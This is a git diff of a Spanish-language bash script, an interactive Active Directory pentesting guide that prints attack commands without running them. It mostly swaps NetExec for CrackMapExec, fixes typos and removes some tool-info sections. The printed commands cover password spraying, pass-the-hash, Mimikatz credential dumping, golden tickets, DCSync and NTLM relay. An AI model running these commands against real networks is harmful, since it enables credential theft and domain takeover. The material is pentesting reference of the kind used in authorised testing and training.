@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Active Directory Pentesting Interactive Guide
-# Guía informativa
+# Active Directory Pentesting Interactive Guide - Versión Completa y Mejorada
+# Guía informativa - No ejecuta comandos automáticamente
 
 # Colores para la interfaz
 RED='\033[0;31m'
@@ -28,17 +28,21 @@ show_banner() {
     echo "|                         PENTESTING EN ACTIVE DIRECTORY                           |"
     echo "|                         Manual de Comandos y Técnicas                            |"
     echo "===================================================================================="
+    echo "===================================================================="
+    echo "Descripción:# Network Pivoting & Discovery"                                                       
+    echo "Guía completa de técnicas de pivoting y descubrimiento de redes"				    
+    echo "Autor: Oliver - github: https://github.com/oliverexx"						    
+    echo "github: https://github.com/oliverexx"								   
+    echo "Linkedin: www.linkedin.com/in/axel-tear"							   
+    echo "Fecha: 2025"  										    
+    echo "===================================================================="
     echo -e "${NC}"
     echo -e "${YELLOW}Domain:${NC} $DOMAIN"
     echo -e "${YELLOW}Domain Controller:${NC} $DC_IP"
     echo -e "${YELLOW}Usuario:${NC} $USERNAME"
-    echo "==================================================================================================="
-    echo -e "${RED}NOTA: Esta es una guía informativa. Los comandos se muestran pero no se ejecutan.${NC}"
-    echo -e "${RED}Creator: github: https://github.com/oliverexx Linkedin:www.linkedin.com/in/axel-tear${NC}"
-    echo "==================================================================================================="
+
     echo
 }
-
 # Función para pausa y continuar
 press_enter() {
     echo
@@ -177,7 +181,7 @@ tools_menu() {
         show_banner
         echo -e "${GREEN}Herramientas y Comandos Útiles:${NC}"
         echo "1. Impacket Suite"
-        echo "2. NetExec (nxc)"
+        echo "2. CrackMapExec"
         echo "3. Kerbrute"
         echo "4. Mimikatz"
         echo "5. Rubeus"
@@ -188,7 +192,7 @@ tools_menu() {
 
         case $option in
             1) impacket_tools_info ;;
-            2) netexec_info ;;
+            2) crackmapexec_info ;;
             3) kerbrute_info ;;
             4) mimikatz_info ;;
             5) rubeus_info ;;
@@ -534,7 +538,7 @@ computer_enum_info() {
     show_command "Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object Name,OperatingSystem" "Enumerar computadoras y su SO con PowerShell"
     show_command "nmap -p 445 --open 192.168.1.0/24" "Escanear la red en busca de hosts con el puerto SMB abierto"
     echo -e "${MAGENTA}Objetivo:${NC} Identificar sistemas (servidores, estaciones de trabajo) en el dominio."
-    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerView, nmap, NetExec."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerView, nmap, crackmapexec."
     echo -e "${MAGENTA}Notas:${NC} Busca sistemas con sistemas operativos antiguos y sin parches, ya que son objetivos fáciles. Los nombres de los equipos a menudo revelan su función (e.g., 'SRV-SQL', 'DC01')."
     press_enter
 }
@@ -558,9 +562,9 @@ port_scan_info() {
     echo
     show_command "nmap -sS -sV -O $TARGET_IP" "Escaneo TCP SYN, detección de versiones and SO"
     show_command "nmap -p 53,88,135,139,389,445,636,3268,3269,5985 $DC_IP" "Escaneo de puertos críticos de AD en un DC"
-    show_command "nxc smb $TARGET_IP/24" "Enumerar información SMB en un rango de IPs con NetExec"
+    show_command "crackmapexec smb $TARGET_IP/24" "Enumerar información SMB en un rango de IPs"
     echo -e "${MAGENTA}Objetivo:${NC} Identificar servicios y puertos abiertos en los sistemas para encontrar vectores de ataque."
-    echo -e "${MAGENTA}Herramientas útiles:${NC} nmap, masscan, NetExec."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} nmap, masscan, crackmapexec."
     echo -e "${MAGENTA}Notas:${NC} Puertos clave en AD: 88 (Kerberos), 389 (LDAP), 445 (SMB), 636 (LDAPS), 3268 (Global Catalog), 5985 (WinRM). Un puerto abierto no siempre es vulnerable, pero es un punto de entrada."
     press_enter
 }
@@ -571,11 +575,11 @@ share_enum_info() {
     echo
     show_command "smbclient -L //$TARGET_IP -N -U \"\"" "Listar shares con sesión nula (sin credenciales)"
     show_command "smbmap -H $TARGET_IP" "Listar shares y permisos con sesión nula usando smbmap"
-    show_command "nxc smb $TARGET_IP/24 --shares" "Listar shares en un rango de IPs con credenciales nulas usando NetExec"
+    show_command "crackmapexec smb $TARGET_IP/24 --shares" "Listar shares en un rango de IPs con credenciales nulas"
     show_command "smbclient -L //$TARGET_IP -U \"$USERNAME%$PASSWORD\"" "Listar shares con credenciales válidas"
     show_command "smbclient //$TARGET_IP/ShareName -c 'ls'" "Conectar a un share y listar archivos"
     echo -e "${MAGENTA}Objetivo:${NC} Encontrar recursos compartidos (shares) de red y analizar sus permisos."
-    echo -e "${MAGENTA}Herramientas útiles:${NC} smbclient, smbmap, NetExec, PowerView."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} smbclient, smbmap, crackmapexec, PowerView."
     echo -e "${MAGENTA}Notas:${NC} La sesión nula permite enumerar shares sin autenticación. Busca siempre shares como SYSVOL y NETLOGON en los DCs, ya que pueden contener scripts de logon o GPOs. Un share con permisos de escritura para 'Everyone' es un gran hallazgo."
     press_enter
 }
@@ -618,7 +622,7 @@ kerberoasting_info() {
     echo -e "${MAGENTA}Objetivo:${NC} Obtener el hash de la contraseña de una cuenta de servicio para crackearlo offline."
     echo -e "${MAGENTA}Requisitos:${NC} Credenciales de cualquier usuario de dominio válido."
     echo -e "${MAGENTA}Herramientas útiles:${NC} GetUserSPNs.py, Rubeus, PowerSploit, Hashcat, John the Ripper."
-    echo -e "${MAGENTA}Notas:${NC} Este ataque es muy sigiloso porque simula un comportamiento legítimo. Se abusa de cuentas de servicio (con SPN) porque suelen tienen contraseñas débiles que no rotan y, a veces, privilegios elevados."
+    echo -e "${MAGENTA}Notas:${NC} Este ataque es muy sigiloso porque simula un comportamiento legítimo. Se abusa de cuentas de servicio (con SPN) porque suelen tener contraseñas débiles que no rotan y, a veces, privilegios elevados."
     press_enter
 }
 
@@ -641,11 +645,11 @@ password_spraying_info() {
     echo -e "${GREEN}Password Spraying:${NC}"
     echo
     show_command "kerbrute passwordspray -d $DOMAIN --dc $DC_IP users.txt 'Summer2025!'" "Password spraying contra Kerberos con kerbrute"
-    show_command "nxc smb $TARGET_IP/24 -u users.txt -p 'Welcome1' --continue-on-success" "Password spraying contra SMB en un rango de IPs con NetExec"
+    show_command "crackmapexec smb $TARGET_IP/24 -u users.txt -p 'Welcome1' --continue-on-success" "Password spraying contra SMB en un rango de IPs"
     show_command "DomainPasswordSpray.ps1 -UserList users.txt -Domain $DOMAIN -PasswordList passlist.txt" "Password spraying con PowerShell"
     echo -e "${MAGENTA}Objetivo:${NC} Probar una o pocas contraseñas comunes contra una gran lista de usuarios para encontrar una cuenta válida."
     echo -e "${MAGENTA}Requisitos:${NC} Una lista de nombres de usuario válidos."
-    echo -e "${MAGENTA}Herramientas útiles:${NC} kerbrute, NetExec, DomainPasswordSpray.ps1."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} kerbrute, CrackMapExec, DomainPasswordSpray.ps1."
     echo -e "${MAGENTA}Notas:${NC} Esta técnica es más sigilosa que la fuerza bruta tradicional porque evita los bloqueos de cuenta. Contraseñas comunes a probar son 'Password1', 'Welcome1', 'Summer2025', 'Fall2025', o el nombre de la empresa seguido de un número y un símbolo. La cuenta 'Administrator' (RID 500) no se puede bloquear."
     press_enter
 }
@@ -656,11 +660,11 @@ pass_the_hash_info() {
     echo
     show_command "psexec.py -hashes :$NTLM_HASH $DOMAIN/$USERNAME@$TARGET_IP" "Obtener una shell remota con PtH usando psexec.py"
     show_command "wmiexec.py -hashes :$NTLM_HASH $DOMAIN/$USERNAME@$TARGET_IP" "Ejecutar comandos vía WMI con PtH"
-    show_command "nxc smb $TARGET_IP/24 -u $USERNAME -H $NTLM_HASH --local-auth" "Validar un hash en múltiples equipos y ejecutar comandos con NetExec"
+    show_command "crackmapexec smb $TARGET_IP/24 -u $USERNAME -H $NTLM_HASH --local-auth" "Validar un hash en múltiples equipos y ejecutar comandos"
     show_command "sekurlsa::pth /user:Admin /domain:$DOMAIN /ntlm:$NTLM_HASH /run:cmd.exe" "Iniciar un proceso con el hash inyectado usando Mimikatz (crea una nueva ventana de cmd)"
     echo -e "${MAGENTA}Objetivo:${NC} Autenticarse en sistemas remotos usando el hash NTLM de un usuario en lugar de su contraseña en texto claro."
     echo -e "${MAGENTA}Requisitos:${NC} Hash NTLM de un usuario y que este tenga privilegios de administrador local en el equipo destino."
-    echo -e "${MAGENTA}Herramientas útiles:${NC} Impacket (psexec, wmiexec), NetExec, mimikatz."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} Impacket (psexec, wmiexec), crackmapexec, mimikatz."
     echo -e "${MAGENTA}Notas:${NC} Técnica fundamental para el movimiento lateral. El hash LM suele estar en blanco (aad3b435b51404eeaad3b435b51404ee), por lo que a menudo se pasa como ':NTHASH'."
     press_enter
 }
@@ -689,7 +693,7 @@ ms14_068_info() {
     show_command "python ms14-068.py -u $USERNAME@$DOMAIN -p '$PASSWORD' -s USER_SID -d $DC_IP" "Generar ticket Kerberos con PyKEK"
     show_command "mimikatz.exe \"kerberos::ptc TICKET.ccache\"" "Inyectar el ticket en memoria con Mimikatz"
     echo -e "${MAGENTA}Objetivo:${NC} Elevar privilegios de un usuario de dominio estándar a Administrador de Dominio."
-    echo -e "${MAGENTA}Requisitos:${NC} Credenciales de un usuario de dominio, su SID and un DC vulnerable (sin el parche KB3011780)."
+    echo -e "${MAGENTA}Requisitos:${NC} Credenciales de un usuario de dominio, su SID y un DC vulnerable (sin el parche KB3011780)."
     echo -e "${MAGENTA}Herramientas útiles:${NC} ms14-068.py (PyKEK), mimikatz, rpcclient."
     echo -e "${MAGENTA}Notas:${NC} Es una vulnerabilidad antigua (2014) pero efectiva en entornos sin parches. ¡Cuidado! El ataque puede fallar si existe un desfase de tiempo (clock skew) entre tu máquina y el DC. Usa 'nmap -p 88 --script krb5-enum-users' o herramientas similares para verificar la hora."
     press_enter
@@ -744,7 +748,7 @@ wmi_exec_info() {
     show_command "wmiexec.py $DOMAIN/$USERNAME:'$PASSWORD'@$TARGET_IP" "Obtener una semi-shell interactiva con Impacket"
     echo -e "${MAGENTA}Objetivo:${NC} Ejecutar comandos en sistemas remotos a través de Windows Management Instrumentation."
     echo -e "${MAGENTA}Requisitos:${NC} Credenciales con privilegios de administrador local en el equipo destino y que el firewall permita WMI (puerto 135 y puertos dinámicos)."
-    echo -e "${MAGENTA}Herramientas útiles:${NC} wmic, Impacket (wmiexec.py), NetExec."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} wmic, Impacket (wmiexec.py), crackmapexec."
     echo -e "${MAGENTA}Notas:${NC} WMI es un método muy común y a menudo menos monitorizado que PsExec. Es ideal para ejecutar comandos de forma sigilosa."
     press_enter
 }
@@ -1031,7 +1035,7 @@ ldap_relay_info() {
     echo
     show_command "ntlmrelayx.py -t ldap://$DC_IP --add-computer NEWPC\\$ -c 'dNSHostName=NEWPC.$DOMAIN'" "Hacer relay para crear una nueva cuenta de máquina"
     show_command "ntlmrelayx.py -t ldaps://$DC_IP --delegate-access" "Hacer relay para delegar control sobre un objeto de AD"
-    echo -e "${MAGENTA}Objetivo:${NC} Reenviar una autenticación NTLM al servicio LDAP de a DC para modificar el directorio (crear usuarios, añadir miembros a grupos, etc.)."
+    echo -e "${MAGENTA}Objetivo:${NC} Reenviar una autenticación NTLM al servicio LDAP de un DC para modificar el directorio (crear usuarios, añadir miembros a grupos, etc.)."
     echo -e "${MAGENTA}Requisitos:${NC} Que el DC no exija LDAP Signing (activado por defecto en DCs modernos) o usar LDAPS (puerto 636)."
     echo -e "${MAGENTA}Herramientas útiles:${NC} ntlmrelayx.py."
     echo -e "${MAGENTA}Notas:${NC} El relay a LDAP es muy poderoso. Si se tiene el hash de una cuenta de máquina con altos privilegios, se puede usar para dumpear todos los hashes del dominio."
@@ -1105,7 +1109,7 @@ adexplorer_info() {
     press_enter
 }
 
-# --- Métodos de Ejecución and Descarga ---
+# --- Métodos de Ejecución y Descarga ---
 
 web_execution_info() {
     show_banner
@@ -1184,7 +1188,7 @@ covenant_info() {
     show_command "dotnet run" "Iniciar Covenant"
     echo -e "${MAGENTA}Objetivo:${NC} Framework de C2 basado en .NET para equipos Red Team."
     echo -e "${MAGENTA}Herramientas útiles:${NC} Covenant, Grunts (implants)."
-    echo -e "${MAGENTA}Notas:${NC} Covenant proporciona a web interface para gestionar implants and operaciones. Es altamente configurable and extensible."
+    echo -e "${MAGENTA}Notas:${NC} Covenant proporciona una interfaz web para gestionar implants and operaciones. Es altamente configurable and extensible."
     press_enter
 }
 
@@ -1224,83 +1228,6 @@ cobalt_strike_info() {
     echo -e "${MAGENTA}Objetivo:${NC} Framework comercial para operaciones de Red Team altamente sofisticadas."
     echo -e "${MAGENTA}Herramientas útiles:${NC} Cobalt Strike, Beacons, Aggressor Script."
     echo -e "${MAGENTA}Notas:${NC} Cobalt Strike es la herramienta preferida por muchos Red Teams profesionales. Ofrece capacidades avanzadas de C2, evasión, and simulación de adversarios."
-    press_enter
-}
-
-# --- Información sobre herramientas ---
-
-netexec_info() {
-    show_banner
-    echo -e "${GREEN}NetExec (nxc) - Herramienta de Evaluación de Red:${NC}"
-    echo
-    show_command "nxc smb $TARGET_IP/24 -u '' -p '' --shares" "Enumerar shares con sesión nula"
-    show_command "nxc smb $TARGET_IP -u $USERNAME -p '$PASSWORD' --shares" "Enumerar shares con credenciales"
-    show_command "nxc smb $TARGET_IP/24 -u users.txt -p 'Welcome1' --continue-on-success" "Password spraying"
-    show_command "nxc smb $TARGET_IP -u $USERNAME -H $NTLM_HASH --local-auth" "Pass-the-Hash"
-    show_command "nxc winrm $TARGET_IP -u $USERNAME -p '$PASSWORD' -x 'whoami'" "Ejecutar comando vía WinRM"
-    echo -e "${MAGENTA}Objetivo:${NC} Herramienta todo-en-uno para enumeración, explotación and post-explotación en entornos de red."
-    echo -e "${MAGENTA}Ventajas sobre CrackMapExec:${NC} Más mantenida, mejor rendimiento, más protocolos soportados, mejor documentación."
-    echo -e "${MAGENTA}Notas:${NC} NetExec es la evolución directa de CrackMapExec. Soporta múltiples protocolos: SMB, WinRM, SSH, LDAP, MSSQL, etc. Es esencial para cualquier pentester de redes Windows/AD."
-    press_enter
-}
-
-impacket_tools_info() {
-    show_banner
-    echo -e "${GREEN}Impacket Suite - Herramientas de Red:${NC}"
-    echo
-    show_command "GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USERNAME" "Kerberoasting"
-    show_command "secretsdump.py -just-dc $DOMAIN/$USERNAME:'$PASSWORD'@$DC_IP" "Dumpear hashes del dominio"
-    show_command "psexec.py $DOMAIN/$USERNAME:'$PASSWORD'@$TARGET_IP" "Obtener shell remota"
-    show_command "ntlmrelayx.py -tf targets.txt -smbsupport" "Relay de NTLM"
-    echo -e "${MAGENTA}Objetivo:${NC} Colección de herramientas para trabajar con protocolos de red en Python."
-    echo -e "${MAGENTA}Notas:${NC} Impacket es una suite fundamental que incluye herramientas para Kerberoasting, Pass-the-Hash, relay de NTLM, dumping de credenciales, and más."
-    press_enter
-}
-
-kerbrute_info() {
-    show_banner
-    echo -e "${GREEN}Kerbrute - Herramienta de Fuerza Bruta Kerberos:${NC}"
-    echo
-    show_command "kerbrute userenum -d $DOMAIN --dc $DC_IP users.txt" "Enumerar usuarios via Kerberos"
-    show_command "kerbrute passwordspray -d $DOMAIN --dc $DC_IP users.txt 'Password123'" "Password spraying"
-    echo -e "${MAGENTA}Objetivo:${NC} Realizar fuerza bruta and enumeración de usuarios a través de Kerberos."
-    echo -e "${MAGENTA}Notas:${NC} Kerbrute es más sigiloso que otros métodos porque usa Kerberos pre-autenticación, lo que genera menos logs de error."
-    press_enter
-}
-
-mimikatz_info() {
-    show_banner
-    echo -e "${GREEN}Mimikatz - Herramienta de Credenciales:${NC}"
-    echo
-    show_command "sekurlsa::logonpasswords" "Dumpear credenciales de memoria (LSASS)"
-    show_command "lsadump::dcsync /domain:$DOMAIN /user:krbtgt" "Dumpear hash krbtgt"
-    show_command "kerberos::golden /user:Admin /domain:$DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /ptt" "Crear Golden Ticket"
-    echo -e "${MAGENTA}Objetivo:${NC} Extraer credenciales, tickets Kerberos, and realizar diversas operaciones de seguridad en Windows."
-    echo -e "${MAGENTA}Notas:${NC} Mimikatz es la herramienta más famosa para extraer credenciales de memoria Windows. Requiere privilegios elevados para funcionar."
-    press_enter
-}
-
-rubeus_info() {
-    show_banner
-    echo -e "${GREEN}Rubeus - Herramienta de Kerberos:${NC}"
-    echo
-    show_command "Rubeus.exe kerberoast /outfile:hashes.txt" "Kerberoasting"
-    show_command "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt" "AS-REP Roasting"
-    show_command "Rubeus.exe harvest /interval:30" "Recolectar tickets TGT"
-    echo -e "${MAGENTA}Objetivo:${NC} Herramienta para abusar de Kerberos desde Windows."
-    echo -e "${MAGENTA}Notas:${NC} Rubeus es la contraparte Windows de muchas herramientas de Impacket. Es excelente para operaciones de Kerberos."
-    press_enter
-}
-
-powersploit_info() {
-    show_banner
-    echo -e "${GREEN}PowerSploit - Framework de PowerShell:${NC}"
-    echo
-    show_command "Invoke-Mimikatz" "Ejecutar Mimikatz desde PowerShell"
-    show_command "Invoke-Kerberoast -OutputFormat Hashcat" "Kerberoasting"
-    show_command "Get-GPPPassword" "Extraer contraseñas GPP"
-    echo -e "${MAGENTA}Objetivo:${NC} Colección de módulos de PowerShell para pentesting."
-    echo -e "${MAGENTA}Notas:${NC} PowerSploit contiene módulos para reconocimiento, exfiltración, escalada de privilegios, persistencia, and más."
     press_enter
 }
 
